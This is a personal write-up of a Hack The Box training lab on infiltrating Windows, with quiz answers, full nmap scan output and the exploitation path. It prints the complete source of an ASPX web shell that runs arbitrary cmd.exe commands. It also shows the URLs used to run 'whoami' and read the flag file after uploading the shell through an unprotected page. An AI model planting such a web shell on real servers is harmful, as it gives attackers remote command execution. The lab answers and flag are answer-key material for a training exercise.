### HTB Pentester Path <br>
### Shells & Payloads - Infiltrating Windows Lab <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>

---

IP:
10.129.94.104

---

### Question 1:
What file type is a text-based DOS script used to perform tasks from the cli? (answer with the file extension, e.g. '.something')

&#x1F6A9; **.bat**


---

### Question 2:
What Windows exploit was dropped as a part of the Shadow Brokers leak? (Format: ms bulletin number, e.g. MSxx-xxx)

&#x1F6A9; you should know this if you're here: **ms17-010**

---

### Question 3:
Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\

blasted off an nmap to see what's shakin:

	$ nmap -A -F -v -sT -sC 10.129.94.104
	
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 17:09 CDT
	NSE: Loaded 156 scripts for scanning.
	NSE: Script Pre-scanning.
	Initiating NSE at 17:09
	Completed NSE at 17:09, 0.00s elapsed
	Initiating NSE at 17:09
	Completed NSE at 17:09, 0.00s elapsed
	Initiating NSE at 17:09
	Completed NSE at 17:09, 0.00s elapsed
	Initiating Ping Scan at 17:09
	Scanning 10.129.94.104 [4 ports]
	Completed Ping Scan at 17:09, 0.03s elapsed (1 total hosts)
	Initiating Parallel DNS resolution of 1 host. at 17:09
	Completed Parallel DNS resolution of 1 host. at 17:09, 0.01s elapsed
	Initiating Connect Scan at 17:09
	Scanning 10.129.94.104 [100 ports]
	Discovered open port 80/tcp on 10.129.94.104
	Discovered open port 139/tcp on 10.129.94.104
	Discovered open port 135/tcp on 10.129.94.104
	Discovered open port 445/tcp on 10.129.94.104
	Completed Connect Scan at 17:09, 0.04s elapsed (100 total ports)
	Initiating Service scan at 17:09
	Scanning 4 services on 10.129.94.104
	Completed Service scan at 17:09, 9.42s elapsed (4 services on 1 host)
	Initiating OS detection (try #1) against 10.129.94.104
	Retrying OS detection (try #2) against 10.129.94.104
	Retrying OS detection (try #3) against 10.129.94.104
	Retrying OS detection (try #4) against 10.129.94.104
	Retrying OS detection (try #5) against 10.129.94.104
	Initiating Traceroute at 17:09
	Completed Traceroute at 17:09, 0.01s elapsed
	Initiating Parallel DNS resolution of 2 hosts. at 17:09
	Completed Parallel DNS resolution of 2 hosts. at 17:09, 0.00s elapsed
	NSE: Script scanning 10.129.94.104.
	Initiating NSE at 17:09
	Completed NSE at 17:09, 11.67s elapsed
	Initiating NSE at 17:09
	Completed NSE at 17:09, 0.04s elapsed
	Initiating NSE at 17:09
	Completed NSE at 17:09, 0.00s elapsed
	Nmap scan report for 10.129.94.104
	Host is up (0.0080s latency).
	Not shown: 96 closed tcp ports (conn-refused)
	PORT    STATE SERVICE      VERSION
	80/tcp  open  http         Microsoft IIS httpd 10.0
	|_http-server-header: Microsoft-IIS/10.0
	|_http-title: 10.129.94.104 - /
	| http-methods: 
	|   Supported Methods: OPTIONS TRACE GET HEAD POST
	|_  Potentially risky methods: TRACE
	135/tcp open  msrpc        Microsoft Windows RPC
	139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
	445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
	No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
	TCP/IP fingerprint:
	OS:SCAN(V=7.94SVN%E=4%D=9/21%OT=80%CT=7%CU=38940%PV=Y%DS=2%DC=T%G=Y%TM=68D0
	OS:77A8%P=x86_64-pc-linux-gnu)SEQ(CI=I)SEQ(SP=101%GCD=1%ISR=10F%TI=I%CI=I%I
	OS:I=I%SS=S%TS=A)OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552N
	OS:W8ST11%O5=M552NW8ST11%O6=M552ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5
	OS:=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%
	OS:T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
	OS:T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=
	OS:O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF
	OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
	OS:%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G
	OS:)IE(R=Y%DFI=N%T=80%CD=Z)
	
	Uptime guess: 0.007 days (since Sun Sep 21 16:59:53 2025)
	Network Distance: 2 hops
	TCP Sequence Prediction: Difficulty=257 (Good luck!)
	IP ID Sequence Generation: Incremental
	Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb-os-discovery: 
	|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
	|   Computer name: SHELLS-WINBLUE
	|   NetBIOS computer name: SHELLS-WINBLUE\x00
	|   Workgroup: WORKGROUP\x00
	|_  System time: 2025-09-21T15:09:32-07:00
	| smb2-time: 
	|   date: 2025-09-21T22:09:33
	|_  start_date: 2025-09-21T22:00:03
	|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: -1s
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
	| smb-security-mode: 
	|   account_used: <blank>
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)

We could probably use msf to attack smb, but i see port 80 is open so i checked out the site. 
These goons put a .aspx file upload page in the sitemap, LULS. Lets try some file inclusion.
Made a simple .aspx test script (**not_malware.aspx**) and uploaded it to the server:

	<%@ Page Language="C#" %>
	<%
	    string cmd = Request.QueryString["cmd"];
	    if (!string.IsNullOrEmpty(cmd))
	    {
	        var output = "";
	        try
	        {
	            System.Diagnostics.Process proc = new System.Diagnostics.Process();
	            proc.StartInfo.FileName = "cmd.exe";
	            proc.StartInfo.Arguments = "/c " + cmd;
	            proc.StartInfo.UseShellExecute = false;
	            proc.StartInfo.RedirectStandardOutput = true;
	            proc.Start();
	            output = proc.StandardOutput.ReadToEnd();
	            proc.WaitForExit();
	        }
	        catch (Exception e)
	        {
	            output = e.Message;
	        }
	        Response.Write(output);
	    }
	    else
	    {
	        Response.Write("Send a cmd query parameter to execute commands.");
	    }
	%>
	

Executed the file on the /uploads dir, and the display message worked.
However, when i tried to upload a rev shell payload written aspx/c#, the server blocked the execution of the script.
So I tried some url...crafting on my recently uploaded file:

    http://10.129.94.104/uploads/not_malware.aspx?cmd=whoami

This displayed the server name in the browser. lets use this method to perform directory traversal to the flag located in C:\.
### Since we need a space for this command we will have to encode that with *%20**:

    http://10.129.94.104/uploads/not_malware.aspx?cmd=type%20C:\flag.txt

the flag displays in the browser:

&#x1F6A9; **EB-Still-W0--edit--rk$**
